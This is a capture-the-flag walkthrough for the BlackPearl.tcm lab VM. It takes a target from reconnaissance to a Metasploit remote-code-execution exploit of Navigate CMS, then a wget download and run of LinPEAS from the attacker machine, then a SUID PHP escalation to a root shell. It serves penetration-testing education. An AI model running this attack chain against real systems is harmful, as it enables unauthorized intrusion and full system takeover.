# BlackPearl.tcm: Capture the Flag (CTF) Walkthrough

## Target Overview

- **Target IP:** `192.168.88.137`
- **Objective:** Gain root access
- **Environment:** Internal lab network (VM-based)

---

## 🔍 Initial Reconnaissance

### Full Port Nmap Scan

We began with a comprehensive Nmap scan to fingerprint services across all TCP ports:

```bash
nmap -T4 -p- -A 192.168.88.137
```

**Key Findings:**

| Port | Service | Version                                 |
|------|---------|------------------------------------------|
| 22   | SSH     | OpenSSH 7.9p1 Debian 10+deb10u2          |
| 53   | DNS     | ISC BIND 9.11.5-P4-5.1+deb10u5           |
| 80   | HTTP    | nginx 1.14.2                             |

- OS Fingerprint suggests: Linux 4.x–5.x / MikroTik RouterOS 7.x
- Host responded with low latency, indicating it's likely on the same subnet.
- Web server running a default Nginx landing page.

---

## 🌐 Web Enumeration

### Default HTTP Page

The homepage at `http://192.168.88.137` displays a default **"Welcome to nginx!"** message.

Viewing the page source revealed an embedded email address:

```html
webmaster: alek@blackpearl.tcm
```

---

## 🏹 Directory Brute Forcing

Used `ffuf` to discover hidden paths:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.88.137/FUZZ
```

### `/secret` Discovered

- Visiting `/secret` triggers an automatic file download.
- File contents: A decoy message mocking the use of directory busting and suggesting there's nothing valuable via that method.

> “Just kidding... search somewhere else. Directory busting won't give anything.” – Alek

Fair enough.

---

## 📡 DNS Recon

Given that port 53 was open (DNS), further enumeration was performed:

```bash
dnsrecon -r 127.0.0.0/24 -n 192.168.88.137 -d blah
```

### Result:

Discovered a DNS record mapping `127.0.0.1` to `blackpearl.tcm`.

### Hosts File Modification

To resolve this custom domain locally:

```bash
echo "192.168.88.137 blackpearl.tcm" >> /etc/hosts
```

After restarting the browser, visiting `http://blackpearl.tcm` revealed a PHP-based web interface.

---

## 🕵️‍♂️ Application Fuzzing & Exploitation

### Directory Bruteforcing Again

New fuzzing on the domain:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ
```

Discovered `/navigate` – a login page powered by **Navigate CMS**.

---

## 💥 Remote Code Execution (RCE)

Upon identifying the CMS, a quick search turned up a known unauthenticated RCE exploit:

- [Exploit-DB 45561](https://www.exploit-db.com/exploits/45561)
- [Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)

### Using Metasploit:

```bash
msf6 > use exploit/multi/http/navigate_cms_rce
msf6 exploit(navigate_cms_rce) > set rhosts 192.168.88.137
msf6 exploit(navigate_cms_rce) > set vhost blackpearl.tcm
msf6 exploit(navigate_cms_rce) > run
```

Boom. Shell access acquired.

---

## 🧱 Upgrading the Shell

The default shell was primitive. A TTY upgrade was needed.

Confirmed Python was installed on the target:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Now working in a full-featured TTY shell.

---

## 📈 Privilege Escalation

### Step 1: Transfer and Execute LinPEAS

On attacker machine:

```bash
cd ~/transfers
python3 -m http.server 80
```

On the victim:

```bash
wget http://192.168.88.128/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Step 2: Analyze LinPEAS Output

Among the findings, several binaries were marked with the SUID bit. One of interest:

- `/usr/bin/php7.3`

### Step 3: Exploit SUID on PHP

Using [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid):

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Success: **Root shell obtained**.

---

## 🏁 Conclusion

- Initial access was gained through a known CMS vulnerability.
- Post-exploitation TTY upgrade and privilege escalation were performed using standard tools and SUID misconfigurations.
- Demonstrates the importance of patching web applications and regularly auditing SUID binaries.

---

## 📌 Tools Used

- `nmap`
- `ffuf`
- `dnsrecon`
- `Metasploit`
- `linpeas`
- `GTFOBins`

---

## ⚠️ Disclaimer

This walkthrough was conducted in a controlled, authorized lab environment. Never test or attack systems without explicit permission.
